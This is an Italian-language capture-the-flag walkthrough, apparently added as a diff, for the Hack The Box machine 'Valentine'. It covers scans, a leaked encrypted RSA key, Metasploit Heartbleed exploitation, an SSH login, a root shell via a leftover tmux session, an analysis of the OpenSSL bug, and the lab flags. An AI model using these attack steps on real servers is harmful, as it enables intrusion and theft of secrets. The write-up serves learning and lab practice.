@@ -1,0 +1,679 @@
+#+TITLE: HTB - Valentine
+#+AUTHOR: Leonardo Tamiano
+#+HTML_HEAD_EXTRA: <style>pre { background-color: #000; color: #bbb; } </style>
+
+* Basic Info
+  :PROPERTIES:
+  :UNNUMBERED: t
+  :END:  
+  - *Default IP*: 10.10.10.79
+  - *Video*: [[https://youtu.be/6LpTVQQ9qMU][HTB Valentine]]
+  - *Table of contents*:
+    #+TOC: headlines 2
+
+  --------------------
+
+  A seguire è riportato un breve walkthrough della macchina *Valentine*
+  offerta dalla piattaforma Hack the Box.
+
+* Enumeration
+** nmap
+*** nmap -sC -sV valentine
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 16:07 CET
+Nmap scan report for valentine (10.129.121.10)
+Host is up (0.051s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
+|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2018-02-06T00:45:25
+|_Not valid after:  2019-02-06T00:45:25
+|_ssl-date: 2021-03-27T15:07:45+00:00; 0s from scanner time.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds    
+    #+end_example
+
+*** nmap -p- valentine
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 16:08 CET
+Failed to resolve "valentine_log.org".
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.17 seconds
+leo@kali:~/repos/valentine$ nmap -p- valentine
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 16:08 CET
+Nmap scan report for valentine (10.129.121.10)
+Host is up (0.052s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 24.66 seconds
+   #+end_example
+
+*** nmap -p 443 --script ssl-heartbleed valentine
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 16:17 CET
+Nmap scan report for valentine (10.129.121.10)
+Host is up (0.052s latency).
+
+PORT    STATE SERVICE
+443/tcp open  https
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       http://cvedetails.com/cve/2014-0160/
+|       http://www.openssl.org/news/secadv_20140407.txt 
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+
+Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
+    #+end_example
+
+** dirsearch
+*** python3 dirsearch.py -r -u http://valentine -e php,txt
+    #+begin_example
+python3 dirsearch.py -r -u http://valentine -e php,txt
+
+  _|. _ _  _  _  _ _|_    v0.4.0 
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 7478 | Recursion level: 1
+
+Error Log: /home/leo/repos/dirsearch/logs/errors-21-03-27_16-10-02.log
+
+Target: http://valentine
+
+Output File: /home/leo/repos/dirsearch/reports/valentine/_21-03-27_16-10-03.txt
+
+[16:10:03] Starting: 
+[16:10:05] 403 -  291B  - /.htaccess.bak1
+[16:10:05] 403 -  291B  - /.htaccess.orig
+[16:10:05] 403 -  293B  - /.htaccess.sample
+[16:10:05] 403 -  291B  - /.htaccess.save
+[16:10:05] 403 -  289B  - /.htaccessBAK
+[16:10:05] 403 -  289B  - /.htaccessOLD
+[16:10:05] 403 -  290B  - /.htaccessOLD2
+[16:10:06] 403 -  281B  - /.htm
+[16:10:06] 403 -  282B  - /.html
+[16:10:06] 403 -  288B  - /.httr-oauth
+[16:10:16] 403 -  285B  - /cgi-bin/     (Added to queue)
+[16:10:17] 301 -  304B  - /dev  ->  http://valentine/dev/     (Added to queue)
+[16:10:17] 200 -    1KB - /dev/
+[16:10:17] 403 -  281B  - /doc/     (Added to queue)
+[16:10:18] 403 -  296B  - /doc/en/changes.html
+[16:10:18] 403 -  295B  - /doc/stable.version
+[16:10:19] 200 -   38B  - /index
+[16:10:19] 200 -   38B  - /index.php
+[16:10:19] 200 -   38B  - /index.php/login/
+[16:10:24] 403 -  290B  - /server-status
+[16:10:24] 403 -  291B  - /server-status/     (Added to queue)
+[16:10:27] Starting: cgi-bin/
+[16:10:29] 403 -  299B  - /cgi-bin/.htaccess.bak1
+[16:10:29] 403 -  299B  - /cgi-bin/.htaccess.orig
+[16:10:29] 403 -  301B  - /cgi-bin/.htaccess.sample
+[16:10:29] 403 -  299B  - /cgi-bin/.htaccess.save
+[16:10:29] 403 -  297B  - /cgi-bin/.htaccessBAK
+[16:10:29] 403 -  297B  - /cgi-bin/.htaccessOLD
+[16:10:29] 403 -  298B  - /cgi-bin/.htaccessOLD2
+[16:10:29] 403 -  289B  - /cgi-bin/.htm
+[16:10:29] 403 -  290B  - /cgi-bin/.html
+[16:10:29] 403 -  296B  - /cgi-bin/.httr-oauth    
+    #+end_example
+
+*** python3 dirsearch.py -w ~/repos/wordlists/dirb/common.txt -u http://valentine -e php,txt
+
+    #+begin_example
+/home/leo/repos/dirsearch/thirdparty/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (3.0.4) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 4613
+
+Error Log: /home/leo/repos/dirsearch/logs/errors-21-03-27_16-12-29.log
+
+Target: http://valentine
+
+Output File: /home/leo/repos/dirsearch/reports/valentine/_21-03-27_16-12-29.txt
+
+[16:12:29] Starting: 
+[16:12:34] 403 -  285B  - /cgi-bin/
+[16:12:35] 200 -  552B  - /decode
+[16:12:35] 301 -  304B  - /dev  ->  http://valentine/dev/
+[16:12:35] 200 -  554B  - /encode
+[16:12:37] 200 -   38B  - /index
+[16:12:37] 200 -   38B  - /index.php
+[16:12:42] 403 -  290B  - /server-status
+
+Task Completed
+   #+end_example
+
+** web server
+*** valentine/dev/hype_key
+    Contains the following (when decoded from hexa to ASCII)
+    
+    #+begin_example
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+    #+end_example
+
+*** valentine/dev/notes.txt
+    #+begin_example
+To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.     
+    #+end_example
+
+*** heartbleed
+    When exploiting the ~heartbleed~ vuln among the memory we see from
+    the server we also get the following
+    
+    #+begin_example
+    $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+    #+end_example
+
+    when we translate this string from base64 we get
+    
+    #+begin_example
+heartbleedbelievethehype    
+    #+end_example
+
+    which is actually the password for the previous RSA key we saw.
+
+** privesc
+*** hype
+**** user flag
+     #+begin_src sh
+cat /home/hype/Desktop/user.txt     
+     #+end_src
+**** root flag
+
+     #+begin_src sh
+tmux -S ./devs/dev_sess
+cat /root/root.txt
+     #+end_src
+
+* Walkthrough
+** Scans iniziali
+   Effettuando i soliti scans con nmap troviamo le seguenti porte
+   aperte
+   
+   #+begin_example
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+   #+end_example
+
+   Andando nel server siamo troviamo un'immagine che fa vedere un
+   cuore che sta sanguinando. Questo è un hint utile per dopo.
+
+   Effettuando poi una semplice enumerazione delle cartelle con
+   ~dirsearch~ troviamo invece le seguenti risorse offerte dal web
+   server
+   
+   #+begin_example
+[16:12:35] 200 -  552B  - /decode
+[16:12:35] 301 -  304B  - /dev  ->  http://valentine/dev/
+[16:12:35] 200 -  554B  - /encode
+[16:12:37] 200 -   38B  - /index
+[16:12:37] 200 -   38B  - /index.php
+   #+end_example
+
+** web server
+   Andando nella cartella ~/dev~ del web server troviamo due files:
+
+   - Il file ~notes.txt~, che contiene il seguente testo
+
+     #+begin_example
+To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+     #+end_example
+
+   - Una file contenente dei bytes in esadecimale, che, quando
+     decodificati utilizzando un *hex-to-ascii* decoder, danno forma ad
+     una chiave privata rsa che è protetta da una password
+
+     #+begin_example
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+     #+end_example
+   
+** heartbleed
+   Il web server messo a disposizione utilizza per supportare il
+   protocollo TLS una versione di ~openssl~ vulnerabile alla famosa
+   vulnerabilità ~heartbleed~. Questo può essere visto eseguendo il
+   seguente comando
+   
+   *nmap -p 443 --script ssl-heartbleed valentine*
+   
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 16:17 CET
+Nmap scan report for valentine (10.129.121.10)
+Host is up (0.052s latency).
+
+PORT    STATE SERVICE
+443/tcp open  https
+| ssl-heartbleed: 
+|   VULNERABLE:
+Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
+  #+end_example
+
+   *Heartbleed* è una famosa vunlerabilità di *OpenSSL*, l'implementazione
+   open source del protocollo TLS, utilizzato per supportare la
+   comunicazione cifrata HTTPS. Le versioni di OpenSSL vulnerabilità
+   ad heartbleed sono le versioni dalla ~1.0.1~ alla ~1.0.1.f~.
+
+   Questa vulnerabilità è conseguenza di come queste versioni di
+   OpenSSL gestiscono i messaggi "hearbeat", tipicamente utilizzati
+   per verificare se la connessione con il server è ancora up. In
+   queste versioni vulnerabili questi messaggi heartbeat non venivano
+   processati correttamente, e un attaccante è in grado di inviare un
+   singolo byte al server dichiarando però di averne inviati 64k
+   bytes. Il server risponde al messaggio inviando indietro 64k
+   bytes. La criticità sta nel fatto che i bytes inviati dal server al
+   client sono presi in modo non controllato dalla memoria del
+   processo, e quindi potrebbero eventualmente includere dei segreti
+   del server.
+
+   ---------------
+
+   Per exploitare questa vulnerabilità possiamo utilizzare il seguente
+   modulo di ~metasploit~.
+   
+   #+begin_src sh
+msfconsole
+search heartbleed
+use auxiliary/scanner/ssl/openssl_heartbleed
+show options
+set verbose true
+set RHOSTS <valentine_ip>
+run
+   #+end_src
+
+   Una volta che lanciamo il modulo otteniamo la seguente risposta.
+
+   #+begin_example
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[*] 10.129.119.210:443    - Leaking heartbeat response #1
+[*] 10.129.119.210:443    - Sending Client Hello...
+[*] 10.129.119.210:443    - SSL record #1:
+[*] 10.129.119.210:443    -     Type:    22
+[*] 10.129.119.210:443    -     Version: 0x0301
+[*] 10.129.119.210:443    -     Length:  86
+[*] 10.129.119.210:443    -     Handshake #1:
+[*] 10.129.119.210:443    -             Length: 82
+[*] 10.129.119.210:443    -             Type:   Server Hello (2)
+[*] 10.129.119.210:443    -             Server Hello Version:           0x0301
+[*] 10.129.119.210:443    -             Server Hello random data:       605c3e5d496a2b8de38ca697baffedd224393feff0de224dd6bc89f46d5920e0
+[*] 10.129.119.210:443    -             Server Hello Session ID length: 32
+[*] 10.129.119.210:443    -             Server Hello Session ID:        8b27bc38edf5a9cbcb83f83a91d8aa14cff400f2abbc0cf6d59fddebdf0e0ced
+[*] 10.129.119.210:443    - SSL record #2:
+[*] 10.129.119.210:443    -     Type:    22
+[*] 10.129.119.210:443    -     Version: 0x0301
+[*] 10.129.119.210:443    -     Length:  885
+[*] 10.129.119.210:443    -     Handshake #1:
+[*] 10.129.119.210:443    -             Length: 881
+[*] 10.129.119.210:443    -             Type:   Certificate Data (11)
+[*] 10.129.119.210:443    -             Certificates length: 878
+[*] 10.129.119.210:443    -             Data length: 881
+[*] 10.129.119.210:443    -             Certificate #1:
+[*] 10.129.119.210:443    -                     Certificate #1: Length: 875
+[*] 10.129.119.210:443    -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, issuer=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, serial=#<OpenSSL::BN:0x00007f74dcd448f8>, not_before=2018-02-06 00:45:25 UTC, not_after=2019-02-06 00:45:25 UTC>
+[*] 10.129.119.210:443    - SSL record #3:
+[*] 10.129.119.210:443    -     Type:    22
+[*] 10.129.119.210:443    -     Version: 0x0301
+[*] 10.129.119.210:443    -     Length:  331
+[*] 10.129.119.210:443    -     Handshake #1:
+[*] 10.129.119.210:443    -             Length: 327
+[*] 10.129.119.210:443    -             Type:   Server Key Exchange (12)
+[*] 10.129.119.210:443    - SSL record #4:
+[*] 10.129.119.210:443    -     Type:    22
+[*] 10.129.119.210:443    -     Version: 0x0301
+[*] 10.129.119.210:443    -     Length:  4
+[*] 10.129.119.210:443    -     Handshake #1:
+[*] 10.129.119.210:443    -             Length: 0
+[*] 10.129.119.210:443    -             Type:   Server Hello Done (14)
+[*] 10.129.119.210:443    - Sending Heartbeat...
+[*] 10.129.119.210:443    - Heartbeat response, 65535 bytes
+[+] 10.129.119.210:443    - Heartbeat response with leak, 65535 bytes
+[*] 10.129.119.210:443    - Printable info leaked:
+<random garbage>
+<random garbage>
+<random garbage>
+<random garbage>
+<random garbage>
+[*] 10.129.119.210:443    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed   
+   #+end_example
+
+   Se lanciamo il comando varie volte, nella memoria ritornata dal
+   server troviamo anche i seguenti dati
+
+   #+begin_example
+b9597dc55b21a2759b480fb102f9999a
+
+Gecko/20100101 Firefox/45.0..Referer:
+https://127.0.0.1/decode.php..Content-Type:
+application/x-www-form-urlencoded..Content-Length:
+42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.....bH..M
+   #+end_example
+
+   La stringa di interesse è la seguente
+   
+   #+begin_example
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==   
+   #+end_example
+
+   che quando viene decodificata in base64 ci permette di ottenere la
+   password ~heartbleedbelievethehype~.
+
+** user flag
+   Utilizzando la password appena trovata possiamo leggere la chiave
+   privata trovata prima nel seguente modo
+   
+   #+begin_src sh
+openssl rsa -in encrypted_id_rsa      
+   #+end_src
+
+   Una volta che abbiamo la chiave rsa possiamo utilizzarla per
+   loggare nella macchina come l'utente ~hype~
+
+   #+begin_src sh
+ssh -i id_rsa hype@valentine   
+   #+end_src   
+
+   L'user flag è quindi disponibile per essere letta nella cartella
+   Desktop.
+   
+   #+begin_src sh
+hype@Valentine:~/Desktop$ cat /home/hype/Desktop/user.txt 
+   #+end_src
+
+** root flag
+   Per quanto riguarda la root flag invece una veloce enumerazione del
+   sistema rivela una cartella interessante ~/.devs~ contente una
+   sessione ~tmux~ messa in pausa. Per riprendere il controllo della
+   sessione possiamo eseguire
+   
+   #+begin_src sh
+tmux -S /.devs/dev_sess
+   #+end_src
+
+   una volta eseguita notiamo che siamo diventati l'utente root, in
+   quanto la sessione lasciata in pausa era una loggata con root. A
+   questo punto quindi possiamo leggere la flag come segue
+
+   #+begin_src sh
+root@Valentine:~# cat /root/root.txt 
+   #+end_src
+   
+* Extra
+** heartbleed (CVE-2014-0160)
+   Per capire il bug heartbleed le seguenti risorse possono essere
+   utili:
+  
+   - [[https://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=96db9023b881d7cd9f379b0c154650d6c108e9a3][Commit in which it was fixed (?)]]
+   - [[https://www.cvedetails.com/cve/CVE-2014-0160/#references][CVE-2014-0160]]
+   - https://www.exploit-db.com/exploits/32745
+   - https://www.exploit-db.com/exploits/32764
+   - https://stackabuse.com/heartbleed-bug-explained/
+
+   Il codice di interesse in particolare si trova nella funzione
+   ~tls1_process_heartbeat~, presente nel file ~./ssl/t1_lib.c~.
+
+   #+begin_src c
+// p points to record data from client
+unsigned char *p = &s->s3->rrec.data[0], *pl;
+unsigned short hbtype;
+unsigned int payload;
+unsigned int padding = 16; /* Use minimum padding */
+
+/* Read type and payload length first */
+hbtype = *p++;
+n2s(p, payload); // read 2 bytes from p and put them in payload
+pl = p;
+
+// now payload has length of data from client
+   #+end_src
+
+   come possiamo vedere, dopo aver letto le informazioni dal messaggio
+   il server alloca la memoria in funzione del numero di bytes
+   specificati dall'utente.
+   
+   #+begin_src c
+if (hbtype == TLS1_HB_REQUEST)
+  {
+    unsigned char *buffer, *bp;
+    int r;
+
+    /* Allocate memory for the response, size is 1 bytes
+     ,* message type, plus 2 bytes payload length, plus
+     ,* payload, plus padding
+     ,*/
+    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
+    bp = buffer;		 
+   #+end_src
+
+   e poi i dati vengono copiati nel messaggio di risposta.
+   
+   #+begin_src c
+/* Enter response type, length and copy payload */
+,*bp++ = TLS1_HB_RESPONSE;
+s2n(payload, bp);
+memcpy(bp, pl, payload);
+bp += payload;
+/* Random padding */
+RAND_pseudo_bytes(bp, padding);
+   #+end_src
+
+   Il problema, che da luogo alla vulnerabilità heartbleed, sta
+   proprio in questa ~memcpy~, in quanto copia ~payload~ bytes da ~pl~ a
+   ~pb~. Il fatto però è che ~pl~ può puntare ad un buffer che contiene
+   molti meno bytes rispetto al numero effettivamente dichiarato dal
+   client. In questi casi nella risposta il server copierà dei byte
+   presi dalla memoria vicina a quella puntata dal buffer ~pl~.
+
+   ------------------
+
+   Per sistemare la vulnerabilità è stato aggiunto il seguente codice
+   all'inizio della funzione, per eliminare il messaggio nei casi in
+   cui il payload inviato dal client è troppo piccolo.
+   
+   #+begin_src c
+/* Read type and payload length first */
+if (1 + 2 + 16 > s->s3->rrec.length)
+  return 0; /* silently discard */
+hbtype = *p++;
+n2s(p, payload);
+if (1 + 2 + payload + 16 > s->s3->rrec.length)
+  return 0; /* silently discard per RFC 6520 sec. 4 */
+pl = p;  
+   #+end_src  
+
+* Legacy                                                           :noexport:
+** getting user flag
+   Runnin gobuster we can see that there seems to be a note in
+   notes.txt saying that the decoder/encoder will have to be fix
+   before going live. It explicitly states "Make sure
+   encoding/decoding" is only done client-side. This essentialy means
+   that the encoding/decoding is probably still done in the server
+   side of things. Thus we have to find a way to exploit this fact in
+   order to get into the server.
+
+   Also in the ~/dev/~ folder we can see a file ~hype_key~. The file seems
+   to be hexadecimal, maybe it was ascii encoded into hex. Indeed it
+   was, having decoded the file we can see that it contained data for
+   a RSA private key. Saving the ascii contents into a file and
+   executing
+   
+   #+begin_src sh
+ssh -i id_rsa valentine@10.10.10.79   
+   #+end_src
+   
+   we are asked for a passphrase for the key ~id_rsa~. To get access we
+   thus need to find this passphrase.
+
+   I also figured out that the server is vulnerable to the heartbleed
+   bug of openSSH. Using metasploit i've been able to extract some
+   memory from the server. However, the only thing that seems to be
+   interesting is the string
+   
+   #+begin_example
+b9597dc55b21a2759b480fb102f9999a   
+   #+end_example
+
+   I don't know what that is. I thought maybe it was the user flag,
+   but i've tried and apparently its not that. Maybe it has something
+   to do with the passphrase?
+
+   Actually another string that looks interesting is
+   
+   #+begin_example
+aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg   
+   #+end_example
+
+   Which when decoded from base64 we get
+   
+   #+begin_example
+heartbleedbelievethehype   
+   #+end_example
+
+   So this is actually the passphrase for the ssh key that i found
+   before. Using ssh-keygen -p I've managed to remove the passphrase
+   so that now the key is decrypted. Now i have to find the user
+   account in order to ssh into the machine.
+
+   Ok, the user is actually ~hype~. So doing
+   
+   #+begin_example
+ssh -i id_rsa hype@10.10.10.79   
+   #+end_example
+
+   gets you inside!
+
+   Once inside I easily got the user flag which was situated in
+   ~/home/hype/Desktop/user.txt~. After that i went to the directory
+   ~/var/www/~ which is the root directory for the web server. I can
+   finally see the php code that hopefully we can exploit.
+
+** I'm stuck
+   [2018-05-03 gio 17:36]
+   
+   I'm stuck. Cannot see to be able to get to root.
+
+   Th only ting i've noted is that, in the root directory of the
+   server, the user hype has access to the img ~omg.jpg~. We probably
+   have to do something with it. However, I have no idea what exactly.
+
+** Still stuck
+   [2018-05-04 ven 00:03]
+
+   If i try to encode the string ~<?php echo system('whoami') ?>~ I get
+   this html code ~<!--?php echo system('whoami') ?-->~.
+
+** Ok, I was stupid
+   [2018-05-04 ven 01:48]
+
+   Ok, I was really stupid with this one.
+
+   Apparently there was a tmux session open in ~/.devs/dev_sess~. The
+   session was left as root...Thefore, just
+
+   #+begin_src sh
+tmux -S dev_sess   
+   #+end_src
+
+   Will open up a root shell. Yep, this easy.
+
+* Flags                                                            :noexport:
+  - *user*: e6710a5464769fd5fcd216e076961750
+  - *root*: f1bb6d759df1f272914ebbc9ed7765b2
